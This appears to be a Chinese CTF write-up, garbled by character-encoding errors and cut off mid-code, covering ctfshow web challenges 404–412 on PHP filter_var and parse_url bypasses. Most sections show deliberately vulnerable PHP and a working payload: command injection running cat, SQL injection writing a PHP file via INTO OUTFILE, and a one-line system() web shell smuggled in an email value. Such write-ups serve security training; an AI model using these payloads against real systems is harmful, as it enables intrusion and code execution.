title="web404"></a>web404</h2><p>é¢˜ç›®</p><h2 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 19:20:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;parse_url å¥½å¼ºå¤§&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">parse_url å¥½å¼ºå¤§</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯è¦æ»¡è¶³host  path  scheme   ä¸‰ä¸ªæ¡ä»¶</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=httphp:<span class="comment">//127.0.0.1111;echo `cat f*`&gt;1.txt;11/a</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯<strong>scheme://host/path</strong></p><p>è®°ä½è¿™ä¸ªæ ¼å¼å°±å¥½</p><p><img src="../images/image-20230330224805520.png" alt="image-20230330224805520"></p><p>æ‰€ä»¥å°±èƒ½ç»•è¿‡</p><h2 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 16:00:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//flag in db</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ä¸é€šè¿‡&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: url in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">ä¸é€šè¿‡</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/kuaile1314/p/12319042.html">filter_var()ç»•è¿‡</a></p><p>è¿™é‡Œæ˜¯æ·»åŠ äº†sqlè¯­å¥æ¥çš„ï¼Œä¸ä¸Šé¢ç»™çš„æ–‡ç« è¯´çš„å†…å®¹ä¸åŒï¼Œç»™çš„æ–‡ç« æ˜¯åˆ©ç”¨JavaScriptç»•è¿‡</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&#x27;select flag from flag into outfile &quot;/var/www/html/1.txt&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è½¬ä¸º<span class="number">16</span>è¿›åˆ¶</span><br><span class="line">http:<span class="comment">//a53d40ee-9871-49a0-8f4a-5463bc97e052.chall.ctf.show/?url=0://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/&quot;/var/www/html/4.php&quot;%23</span></span><br><span class="line"></span><br><span class="line">è®¿é—®<span class="number">1</span>.txtå³å¯</span><br><span class="line">è½¬åŒ–ä¸º<span class="number">16</span>è¿›åˆ¶ç»•è¿‡filteræ£€æµ‹</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯å…ˆæŠŠå½“</p><p><img src="../images/image-20230331155504698.png" alt="image-20230331155504698"></p><p>å°±ä¼šæ‰§è¡Œsqlè¯­å¥ï¼Œç„¶åæŠŠpayloadå†™åˆ°4.phpä¸Šï¼Œç„¶åè®¿é—®4.phpå°±ä¼šæ‰§è¡Œpayloadå†™çš„è¯­å¥ï¼Œç„¶åè®¿é—®1.txtå°±è¡Œäº†</p><h2 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 17:24:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IPv6çš„128ä½åœ°å€é€šå¸¸å†™æˆ8ç»„ï¼Œæ¯ç»„ä¸ºå››ä¸ªåå…­è¿›åˆ¶æ•°çš„å½¢å¼ã€‚æ¯”å¦‚ï¼šAD80:0000:0000:0000:ABAA:0000:00C2:0002 æ˜¯ä¸€ä¸ªåˆæ³•çš„IPv6åœ°å€ã€‚è¿™ä¸ªåœ°å€æ¯”è¾ƒé•¿ï¼Œçœ‹èµ·æ¥ä¸æ–¹ä¾¿ä¹Ÿä¸æ˜“äºä¹¦å†™ã€‚é›¶å‹ç¼©æ³•å¯ä»¥ç”¨æ¥ç¼©å‡å…¶é•¿åº¦ã€‚å¦‚æœå‡ ä¸ªè¿ç»­æ®µä½çš„å€¼éƒ½æ˜¯0ï¼Œé‚£ä¹ˆè¿™äº›0å°±å¯ä»¥ç®€å•çš„ä»¥::æ¥è¡¨ç¤º</p><p><strong>call_user_func</strong></p><p><img src="../images/image-20230331160426788.png" alt="image-20230331160426788"></p><p>ç„¶åå°±å¯ä»¥å†™å‡ºpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cafe::add</span><br></pre></td></tr></table></figure><h2 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 19:53:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>explodeå°±æ˜¯åˆ†å‰²å‡½æ•°</strong></p><p>å°±æ˜¯å°†ä¼ è¿›æ¥çš„emailåˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œå‰é¢æ˜¯filename,åé¢æ˜¯content</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;&lt;?=system(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.php</span><br></pre></td></tr></table></figure><p>ç»•è¿‡çš„åŸå› æ˜¯<strong>éæ³•å­—ç¬¦å¯ä»¥æ”¾åœ¨åŒå¼•å·é‡Œé¢ç»•è¿‡æ£€æµ‹</strong></p><p>è¿™é‡Œç”¨çŸ­æ ‡ç­¾çš„æ„æ€æ˜¯å› ä¸ºï¼Œä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå› ä¸ºæœ‰ä¸ªåŒå¼•å·ç„¶åæµè§ˆå™¨ä¼šæŠŠç©ºæ ¼<a href="https://so.csdn.net/so/search?q=è½¬ä¹‰&amp;spm=1001.2101.3001.7020">è½¬ä¹‰</a>ä¸º%20ï¼Œç„¶åå› ä¸ºåŒå¼•å·åŒ…å«ï¼Œæœ€åå¯¼è‡´å†™ä¸è¿›æ–‡ä»¶</p><h2 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 20:26:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æœ‰ä¸ªæ›¿æ¢ä¸º<code>.flag</code>ä¹Ÿå°±æ˜¯æŠŠflagå’Œå®ƒå‰é¢é‚£ä¸ªå­—ç¬¦æ›¿æ¢ä¸ºç©ºï¼Œè¿™å°±å¯ä»¥æŠŠemaiå½“ä¸­å‰é¢åŒå¼•å·è¿™ä¸ªéæ³•å­—ç¬¦ç»™æ›¿æ¢æ‰ï¼Œé¿å…åœ¨phpç¯å¢ƒé‡Œé¢å‡ºé”™</p><p>@åé¢æ˜¯ä¸ç¬¦åˆphpè¯­å¥æ ¼å¼çš„å­—ç¬¦å°è¯•é—­åˆç½‘é¡µå½“ä¸­å‰é¢çš„<code>&lt;?php</code></p><p><strong>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¼šè¾“å‡º@123.comçš„åŸå› </strong></p><p><img src="../images/image-20230331165032665.png" alt="image-20230331165032665"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;flagsystem(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.com</span><br><span class="line">ç„¶åpostæ•°æ®</span><br><span class="line"><span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><p>ä¼šæŠŠâ€flagç»™æ›¿æ¢æˆç©ºï¼Œç„¶åå°±ä¼šæ‰§è¡Œeval(system($_POST[1]);?&gt;)</p><p>è¿™é‡Œæ‰§è¡Œè™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯è¿˜æ˜¯èƒ½æ‰§è¡Œçš„</p><h2 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/php/filter_validate_boolean.asp">å‚è€ƒæ–‡ç« </a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span 